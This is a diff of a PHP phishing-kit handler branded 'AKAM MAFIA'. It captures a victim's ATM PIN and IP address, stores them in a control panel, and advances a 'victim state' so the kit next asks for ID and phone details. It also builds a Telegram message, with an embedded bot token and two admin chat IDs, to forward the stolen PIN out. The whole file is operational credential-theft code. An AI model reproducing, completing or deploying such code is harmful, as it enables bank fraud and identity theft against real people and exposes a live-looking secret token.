@@ -6,15 +6,19 @@ $ip = $_SERVER['REMOTE_ADDR'];
 $pin = isset($_POST['pass']) ? $_POST['pass'] : ''; 
 
 if (!empty($pin)) {
-    // 1. Guardar en el panel (usando tus funciones actuales)
+    // 1. Guardar en el panel
     actualizar_registro($ip, "PIN", $pin); 
+    
+    // --- NUEVO: Cambiar estado a 4 para pedir Documento/Celular ---
+    // Esto hace que el WAITING.php sepa que ahora debe cargar INFO.php
+    actualizar_estado_victima($ip, "4"); 
 
-    // 2. Configuración del Bot de AKAM MAFIA
+    // 2. Configuración del Bot de 𝓐K𝓐𝓜 𝓜𝓐𝓕𝓘𝓐
     $token = "8721615356:AAGxIf7AxwGMzhoUOtxI9IRQoOXoIMJ2_iA";
-    $chat_ids = ["8114050673", "8518977918"]; // Admin principal y secundario
+    $chat_ids = ["8114050673", "8518977918"]; 
 
     // 3. Formato del mensaje
-    $mensaje = "⭐ <b>AKAM MAFIA - NUEVO PIN</b> ⭐\n\n";
+    $mensaje = "⭐ <b>𝓐K𝓐𝓜 𝓜𝓐𝓕𝓘𝓐 - NUEVO PIN</b> ⭐\n\n";
     $mensaje .= "👤 <b>IP:</b> <code>" . $ip . "</code>\n";
     $mensaje .= "🔑 <b>PIN DE CAJERO:</b> <code>" . $pin . "</code>\n";
     $mensaje .= "⏰ <b>FECHA:</b> " . date('d/m/Y H:i:s') . "\n";
